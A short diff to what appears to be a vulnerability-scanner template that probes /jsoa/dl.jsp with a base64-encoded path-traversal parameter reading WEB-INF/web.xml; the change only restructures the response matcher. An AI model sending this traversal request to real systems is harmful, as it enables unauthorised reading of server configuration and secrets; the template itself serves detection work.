@@ -7,5 +7,4 @@ path:
   - /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h
 expression:
   status: 200
-  body_any:
-    body_all: ["web-app"]
+  body_all: ["web-app"]
